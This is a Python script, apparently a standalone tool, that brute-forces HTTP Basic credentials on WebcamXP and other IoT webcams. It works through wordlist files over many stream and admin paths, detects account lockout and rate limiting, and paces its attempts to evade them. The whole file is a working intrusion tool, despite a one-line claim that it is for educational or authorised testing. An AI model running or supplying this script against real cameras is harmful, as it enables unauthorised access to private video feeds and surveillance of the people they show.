#!/usr/bin/env python3
'''
Enhanced WebcamXP / IoT webcam brute forcer with locked-camera handling, lockout detection, multiple URLs, 
smart pacing. Uses existing camera_credentials.txt as primary wordlist + smart additions.
Educational/penetration testing only on devices you own or have permission to test.
'''

import requests, time, sys, os, json, threading
from concurrent.futures import ThreadPoolExecutor, as_completed
from requests.auth import HTTPBasicAuth
from urllib.parse import urljoin, urlparse

class WebcamXPBruter:
    def __init__(self, target, max_workers=1, timeout=8, lockout_threshold=10, lockout_wait=300):
        # Parse target
        if not target.startswith('http'):
            target = 'http://' + target
        self.target = target.rstrip('/')
        self.max_workers = max_workers
        self.timeout = timeout
        self.lockout_threshold = lockout_threshold  # how many fails before lockout
        self.lockout_wait = lockout_wait  # seconds to wait after lockout
        self.session = requests.Session()
        self.session.headers['User-Agent'] = 'Mozilla/5.0'
        self.attempts = 0
        self.locked_at = None
        self.locked_url = None
        self.found = None
        self.stop = threading.Event()
        self.log = []
        self.try_paths = [
            '/cam_1.cgi', '/cam_1.jpg', '/cam_1.mjpg', '/cam_1.mjpeg',
            '/admin.html', '/', '/index.html', '/web/mainpage.html',
            '/Streaming/Channels/1', '/video.cgi', '/mjpg/video.mjpg',
            '/ISAPI/Streaming/channels/1', '/livestream/1',
        ]

    def is_locked(self):
        '''Check if any path returned a lockout response'''
        if self.locked_at and time.time() < self.locked_at + self.lockout_wait:
            return True
        elif self.locked_at and time.time() >= self.locked_at + self.lockout_wait:
            self.locked_at = None  # lockout expired
            return False
        return False

    def try_creds(self, creds, paths=None):
        if self.stop.is_set():
            return None
        if paths is None:
            paths = self.try_paths
        u, p = creds
        for path in paths:
            if self.is_locked():
                self.stop.set()
                return 'LOCKED'
            url = urljoin(self.target, path)
            try:
                r = self.session.get(url, auth=HTTPBasicAuth(u, p), timeout=self.timeout, stream=False)
                ct = r.headers.get('Content-Type', '')
                cl = r.headers.get('Content-Length', '0')
                self.attempts += 1
                if r.status_code == 200 and ('image' in ct or 'multipart' in ct or 'video' in ct or 'html' in ct or path.endswith('.html')):
                    # Check if it's a real page (not login)
                    if r.status_code == 200:
                        body = r.text[:500].lower() if 'html' in ct else b''
                        if any(x in body for x in ['<html', 'webcamxp', 'mainpage', 'c6f0', 'hi3510', 'ipcam']):
                            # Looks like a real authenticated/visible cam view
                            self.found = (creds, path, r.status_code, ct)
                            self.stop.set()
                            return 'FOUND', creds, path, r.status_code, ct
                elif r.status_code == 200 and 'image' in ct:
                    self.found = (creds, path, r.status_code, ct)
                    self.stop.set()
                    return 'FOUND', creds, path, r.status_code, ct
                elif r.status_code == 401:
                    # Might be locked
                    if 'lockStatus>lock' in r.text or 'locked' in r.text.lower() or 'lockout' in r.text.lower() or 'retryLoginTime' in r.text:
                        self.locked_at = time.time()
                        self.locked_url = url
                        self.stop.set()
                        return 'LOCKED'
                    # else: just wrong creds
                    return 'WRONG'
                elif r.status_code == 404:
                    continue
                elif r.status_code == 503:
                    # service unavailable (busy/connection limit)
                    time.sleep(2)
                elif r.status_code == 429:
                    # rate limited
                    self.locked_at = time.time()
                    self.stop.set()
                    return 'RATE_LIMITED'
            except requests.exceptions.Timeout:
                return 'TIMEOUT'
            except requests.exceptions.ConnectionError:
                return 'CONNECT_ERR'
            except Exception as e:
                return f'ERR: {str(e)[:50]}'
        return 'NO_PATH'

    def load_creds(self, files=['camera_credentials.txt', 'camera_brands_credentials.txt']):
        '''Load creds from wordlist files'''
        creds = set()
        base = os.path.dirname(__file__)
        for fn in files:
            fp = os.path.join(base, fn)
            if not os.path.exists(fp):
                continue
            with open(fp) as f:
                for line in f:
                    line = line.strip()
                    if not line or line.startswith('#'):
                        continue
                    if ':' in line and not line.startswith('http'):
                        parts = line.split(':', 1)
                        if len(parts) == 2:
                            creds.add(tuple(parts))
        return list(creds)

    def run(self, paths=None, max_creds=None, delay=0.5):
        creds = self.load_creds()
        if max_creds:
            creds = creds[:max_creds]
        print(f'[*] Target: {self.target}')
        print(f'[*] Loaded {len(creds)} credential pairs')
        print(f'[*] Trying {len(self.try_paths)} paths each')
        print(f'[*] Pacing: {delay}s between attempts')
        print()
        
        for i, cred in enumerate(creds):
            if self.stop.is_set():
                break
            if self.is_locked():
                wait = self.locked_at + self.lockout_wait - time.time()
                if wait > 0:
                    print(f'[!] Locked. Waiting {wait:.0f}s for unlock...')
                    self.stop.wait(timeout=wait+5)
                    if self.is_locked():
                        print(f'[!] Still locked after timeout. Aborting.')
                        return None
            time.sleep(delay)
            r = self.try_creds(cred, paths)
            if isinstance(r, tuple) and r[0] == 'FOUND':
                creds_, path, status, ct = r[1], r[2], r[3], r[4]
                print(f'[+] FOUND {creds_} -> {path} HTTP={status} CT={ct[:30]}')
                return {'creds': creds_, 'path': path, 'status': status, 'content_type': ct}
            elif r in ('LOCKED', 'RATE_LIMITED'):
                print(f'[!] {r} after {cred} - waiting...')
                return None
            elif i % 50 == 0:
                print(f'[*] Tried {i+1}/{len(creds)} ({cred})')
        if self.found:
            return {'creds': self.found[0], 'path': self.found[1], 'status': self.found[2], 'content_type': self.found[3]}
        print(f'[-] No valid creds found in {len(creds)} pairs')
        return None

if __name__ == '__main__':
    target = sys.argv[1] if len(sys.argv) > 1 else None
    if not target:
        print('Usage: webcamxp_bruter_enhanced.py <target_url>')
        sys.exit(1)
    b = WebcamXPBruter(target)
    result = b.run(delay=1.0)
    if result:
        print(json.dumps(result, indent=2))
